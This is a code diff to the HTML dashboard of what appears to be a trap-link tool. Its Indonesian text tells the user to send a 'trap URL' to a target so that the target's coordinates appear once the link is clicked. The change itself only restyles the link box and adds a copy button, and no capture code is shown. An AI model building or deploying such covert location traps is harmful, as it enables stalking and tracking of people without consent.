@@ -461,9 +461,16 @@
                     <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
                         tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
 
-                    <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()"
-                        style="cursor:pointer; width: 100%; box-sizing: border-box; margin-bottom: 15px;"
-                        title="Klik Untuk Copy"></div>
+                    <div
+                        style="display:flex; justify-content:center; align-items:stretch; gap: 10px; margin-bottom: 15px;">
+                        <div class="trap-linkbox" id="displayTrapLink"
+                            style="flex: 1; margin: 0; text-align: left; display: flex; align-items: center; padding-left: 15px;"
+                            title="Link Jebakan"></div>
+                        <button onclick="copyTrapLink()" title="Copy Link"
+                            style="background: var(--primary); color: #000; border: none; border-radius: 8px; cursor: pointer; padding: 0 20px; font-weight: bold; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease;">
+                            <i data-lucide="copy" style="width:20px;"></i>
+                        </button>
+                    </div>
 
                     <div style="display:flex; justify-content:center; gap:15px; margin-bottom: 2rem;">
                         <button onclick="shareDashboard()" title="Bagikan Dashboard ke Teman"
